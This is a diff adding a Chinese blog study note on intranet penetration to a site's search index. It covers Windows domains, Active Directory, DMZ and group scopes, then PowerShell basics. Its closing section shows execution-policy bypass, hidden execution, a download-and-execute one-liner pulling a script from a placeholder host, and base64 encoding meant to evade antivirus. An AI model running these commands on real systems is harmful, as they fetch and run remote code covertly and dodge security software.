@@ -910,4 +910,150 @@
         <tag>sql</tag>
       </tags>
   </entry>
+  <entry>
+    <title>内网学习笔记</title>
+    <url>/2021/07/05/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="内网学习笔记"><a href="#内网学习笔记" class="headerlink" title="内网学习笔记"></a>内网学习笔记</h1><h2 id="一、基础概念学习"><a href="#一、基础概念学习" class="headerlink" title="一、基础概念学习"></a>一、基础概念学习</h2><h3 id="工作组work-group"><a href="#工作组work-group" class="headerlink" title="工作组work group"></a>工作组<code>work group</code></h3><p>使最简单最普通的资源管理模式</p>
+<p>将不同的计算机按照功能或部门分别列入不同的工作组，想要访问某个工作组的内容，在“网上邻居”里双击想要访问的工作组即可</p>
+<h4 id="加入-创建工作组"><a href="#加入-创建工作组" class="headerlink" title="加入/创建工作组"></a>加入/创建工作组</h4><p>控制面板–&gt;系统安全–&gt;系统</p>
+<p>重命名这台电脑–&gt;更改</p>
+<p><img src="https://i.loli.net/2021/07/06/jAdtFibEVLv2Dnf.png" alt="image-20210706100638761"></p>
+<p>工作组中的计算机是平等的，也被称为对等网站，而对管理者而言，工作组的管理方式有时不太方便，这时候就要学习域的概念了</p>
+<h3 id="域domain"><a href="#域domain" class="headerlink" title="域domain"></a>域<code>domain</code></h3><p>是一个有安全边界的计算机集合（安全边界就是在两个域中，一个域中的用户无法访问另一个域中的）</p>
+<p>可以简单理解为工作组的升级版，域的安全管理机制更加严格，获取什么样权限的资源必须要先登录到域，而且还取决于用户在域中的身份</p>
+<h4 id="域控制器-DC"><a href="#域控制器-DC" class="headerlink" title="域控制器 DC"></a>域控制器<code> DC</code></h4><p><code>domain controller</code>至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器</p>
+<p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</p>
+<blockquote>
+<p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源</p>
+</blockquote>
+<p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码</p>
+<p>内网中的一台主机+安装活动目录=域控</p>
+<blockquote>
+<p>在域中除了域控制器还有成员服务器、客户机、独立服务器</p>
+</blockquote>
+<h4 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h4><p>顾名思义，一个域下新建的域就是子域，而这个大的域则是父域</p>
+<p>每个域中都有独立的安全策略</p>
+<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><p>是多个域通过建立信任关系组成的集合，活动目录包含一个或多个域树</p>
+<p>域树中的域层次越深级别越低，一个“.”代表一个层次</p>
+<blockquote>
+<p>如域child.Microsoft.com 就比 Microsoft.com这个域级别低</p>
+<p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低</p>
+</blockquote>
+<p>多个域树可以组成一个域林</p>
+<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>是指由一个或多个没有形成连续名字空间的域树组成</p>
+<p>与域树之间的区别：</p>
+<blockquote>
+<p>最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成</p>
+</blockquote>
+<p>域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系</p>
+<h4 id="域名服务器DNS"><a href="#域名服务器DNS" class="headerlink" title="域名服务器DNS"></a>域名服务器<code>DNS</code></h4><p>是指用于实现域名和与之相对应的ip地址转换的服务器</p>
+<p>在内网渗透测试中，大部分是通过寻找dns服务器来确定域控的位置（dns服务器和域控通常配置在同一台机器上）</p>
+<h3 id="活动目录-AD"><a href="#活动目录-AD" class="headerlink" title="活动目录  AD"></a>活动目录 <code> AD</code></h3><p><code>Active Directory</code></p>
+<p>是指域环境中提供目录服务的组件</p>
+<blockquote>
+<p>是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中</p>
+</blockquote>
+<p>如果将内网看做一本字典，那么内网里的资源就是字典的内容，而活动目录相当于字典的索引，活动目录存储的是网络中所有资源的快捷方式，使用活动目录用户就可以通过寻找快捷方式来定位资源</p>
+<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p><code>demilitarized zone</code>也就是隔离区</p>
+<p>DMZ位于内网和外网之间，通常放置一些必须公开但不含机密信息的公开的服务器设施，如web服务器、email服务器、ftp服务器</p>
+<p>一般情况下，DMZ不能访问内网和外网，而内网和外网均能访问DMZ，为了保护内网和完成正常的业务</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/lvTqB4HLwG0PkL4jIMkLOpawzxrDO0F2Malg9Ona0DWktgtclPWx3NGRWChnFNgBzfKcwucgLAPdIkE5ZVmBIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<h3 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h3><p>学习一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行</p>
+<p>常见的组有：域本地组、全局组、通用组</p>
+<h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>主要用于授予本域内资源的访问权限</p>
+<p>成员范围：所有的域；使用范围：自己所在的域</p>
+<h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>只能在创建它的域中添加用户和组，不能添加到不同域的全局组中</p>
+<p>成员范围：自己所在的域；使用范围：所有的域</p>
+<h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>成员范围：所有的域；使用范围：所有的域</p>
+<blockquote>
+<p>可以这样简单记忆：域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林</p>
+</blockquote>
+<h4 id="AG-D-L-P策略"><a href="#AG-D-L-P策略" class="headerlink" title="AG-D-L-P策略"></a>AG-D-L-P策略</h4><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p>
+<ul>
+<li>A 表示用户账号<code>account</code></li>
+<li>G 表示全局组<code>global</code></li>
+<li>U 表示通用组<code>universal</code></li>
+<li>DL 表示域本地组<code>domain local</code></li>
+<li>P 表示资源权限<code>permission</code></li>
+</ul>
+<h2 id="二、powershell"><a href="#二、powershell" class="headerlink" title="二、powershell"></a>二、powershell</h2><h3 id="什么是powershell"><a href="#什么是powershell" class="headerlink" title="什么是powershell"></a>什么是powershell</h3><p>PowerShell 是一种跨平台的任务自动化解决方案，由命令行 shell、脚本语言和配置管理框架组成。 PowerShell 在 Windows、Linux 和 macOS 上运行</p>
+<p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework 的强大功能</p>
+<h3 id="powershell的特点"><a href="#powershell的特点" class="headerlink" title="powershell的特点"></a>powershell的特点</h3><ul>
+<li>Windows 7 以上的操作系统默认安装</li>
+<li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li>
+<li>可以从另一个系统中下载 PowerShell 脚本并执行</li>
+<li>目前很多工具都是基于 PowerShell 开发的</li>
+<li>很多安全软件检测不到 PowerShell 的活动</li>
+<li>cmd 通常会被阻止运行，但是 PowerShell 不会</li>
+<li>可以用来管理活动目录</li>
+<li>PowerShell 是一种跨平台的任务自动化解决方案，由命令行 shell、脚本语言和配置管理框架组成。 PowerShell 在 Windows、Linux 和 macOS 上运行</li>
+</ul>
+<h3 id="Windows-操作系统对应的-PowerShell-版本信息"><a href="#Windows-操作系统对应的-PowerShell-版本信息" class="headerlink" title="Windows 操作系统对应的 PowerShell 版本信息"></a>Windows 操作系统对应的 PowerShell 版本信息</h3><p>1.0     windows server 2008</p>
+<p>2.0     windows server 2008 r2、windows 7</p>
+<p>3.0     windows server 2012、windows 8</p>
+<p>4.0     windows server 2012 r2、windows 8.1</p>
+<p>5.0     windows 10</p>
+<p>5.1     windows server 2016</p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h4><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件</p>
+<h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>（即不能运行）</p>
+<p>查询当前执行策略<code>get-executionpolicy</code></p>
+<p><img src="https://i.loli.net/2021/07/06/kEcVy4WYgD6df1a.png" alt="image-20210706204210412"></p>
+<h5 id="执行策略的种类"><a href="#执行策略的种类" class="headerlink" title="执行策略的种类"></a>执行策略的种类</h5><blockquote>
+<p><strong>Restricted</strong>：不能运行脚本</p>
+<p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p>
+<p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。</p>
+<p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名</p>
+</blockquote>
+<h5 id="设置执行策略"><a href="#设置执行策略" class="headerlink" title="设置执行策略"></a>设置执行策略</h5><p><code>set-executionpolicy 执行策略</code></p>
+<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p> 输入完整路径或是直接到脚本文件所在目录下使用<code>.\ xxx.ps1</code></p>
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>同linux中的管道，就是将管道符<code>|</code>前一个命令的输出作为后一个命令的输入</p>
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><h4 id="获取版本号"><a href="#获取版本号" class="headerlink" title="获取版本号"></a>获取版本号</h4><p><code>get-host</code></p>
+<p><img src="https://i.loli.net/2021/07/06/hafSoB1Z4sVj65E.png" alt="image-20210706203505337"></p>
+<p><code>$psversiontable</code></p>
+<p><img src="https://i.loli.net/2021/07/06/AJqisPd9ouYx4jX.png" alt="image-20210706203518099"></p>
+<h4 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">新建目录test：New-Item test -ItemType directory</span><br><span class="line">删除目录test：Remove-Item test</span><br><span class="line">新建文件test.txt：New-Item test.txt -ItemType file</span><br><span class="line">新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;</span><br><span class="line">删除文件test.txt：Remove-Item test.txt</span><br><span class="line">查看文件test.txt内容：Get-Content  test.txt</span><br><span class="line">设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;</span><br><span class="line">给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;</span><br><span class="line">清除文件test.txt内容：Clear-Content test.txt</span><br></pre></td></tr></table></figure>
+<p>总结一下就是</p>
+<p>新建命令<code>New-Item 目录名/文件名-ItemType directory/file</code></p>
+<p>删除命令<code>Remove-Item 目录名/文件名</code></p>
+<p>查看文件内容<code>get-content</code></p>
+<p>设置文件内容<code>Set-Content 文件名 -Value &quot;设置的内容&quot;</code></p>
+<p>追加文件内容<code>Add-Content 文件名 -Value &quot;追加的内容&quot;</code></p>
+<p>清除文件内容<code>clear-content 文件名</code></p>
+<h3 id="策略绕过"><a href="#策略绕过" class="headerlink" title="策略绕过"></a>策略绕过</h3><p>因为默认的执行策略是<code>restricted</code>，要进行绕过，变成<code>unrestricted</code></p>
+<h4 id="1-绕过本地权限并执行"><a href="#1-绕过本地权限并执行" class="headerlink" title="1.绕过本地权限并执行"></a>1.绕过本地权限并执行</h4><p>先来看一下默认受限模式下执行脚本的情况</p>
+<p>查看策略<code>powershell.exe get-executionpolicy</code></p>
+<p>执行脚本<code>powershell.exe -file 1.ps1</code></p>
+<p><img src="https://i.loli.net/2021/07/07/e2UbgOo8KJqyGRd.png" alt="image-20210707174243905"></p>
+<p>将”hello”写入<code>1.ps1</code>文件 <code> &#39;&quot;hello&quot;&#39;&gt;1.ps1</code></p>
+<p>并执行<code> powershell.exe -executionpolicy bypass -file 1.ps1</code></p>
+<p><img src="https://i.loli.net/2021/07/07/pAFcTBueqh74tYk.png" alt="image-20210707180201499"></p>
+<h4 id="2-绕过本地权限并隐藏执行"><a href="#2-绕过本地权限并隐藏执行" class="headerlink" title="2.绕过本地权限并隐藏执行"></a>2.绕过本地权限并隐藏执行</h4><p>上一条命令<code>-executionpolicy bypass</code>之后再加上<code>-windowstyle hidden -nologo -noninteractive -noprofile</code>即可隐藏执行</p>
+<p><code>powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noninteractive -noprofile -file 1.ps1</code></p>
+<p>执行的话窗口会直接退出，就是隐藏执行</p>
+<h5 id="下载远程脚本并隐藏执行"><a href="#下载远程脚本并隐藏执行" class="headerlink" title="下载远程脚本并隐藏执行"></a>下载远程脚本并隐藏执行</h5><p>将<code>-file 1.ps1</code>替换为<code>&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://ip/t.ps1&#39;)&quot;</code></p>
+<p><code>powershell.exe -executionpolicy bypass -windowstyle hidden -nologo -noninteractive -noprofile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://ip/t.ps1&#39;)&quot;</code></p>
+<p>其中隐藏执行的代码可以简写成<code>-Exec Bypass -W Hidden -NoLogo -NonI -NoP</code></p>
+<h4 id="3-使用base64对powershell命令进行编码"><a href="#3-使用base64对powershell命令进行编码" class="headerlink" title="3.使用base64对powershell命令进行编码"></a>3.使用base64对powershell命令进行编码</h4><p>使用base64对命令进行编码的目的是为了混淆代码以避免被杀毒软件查杀</p>
+<p>这里使用到了<code>ps_encoder.py</code></p>
+<blockquote>
+<p> ps_encoder.py是使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码</p>
+</blockquote>
+<p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">ps_encoder.py下载地址</a></p>
+<p>下载好之后，先将要执行的命令保存到文本<code>1.txt</code>中，之后执行<code>python ps_encoder.py -s 1.txt</code></p>
+<p>然后使用<code>-enc</code>指定base编码内容</p>
+<p><code>powershell.exe -exec bypass -enc YwBtAGQA</code></p>
+<p><img src="https://i.loli.net/2021/07/07/LYm7tGgdMTplD85.png"></p>
+<p>然后就被火绒拦截了。。</p>
+<p>下星期去了解一下免杀</p>
+<p><img src="https://i.loli.net/2021/07/07/gMXQodxYISUP6Rc.png" alt="image-20210707213652646"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/2JdMRgA9TlCV5hwO6ihVWQ">内网学习笔记 | 1、内网中常见名词解释</a></p>
+<p>内网安全攻防渗透测试实战指南</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+      </tags>
+  </entry>
 </search>
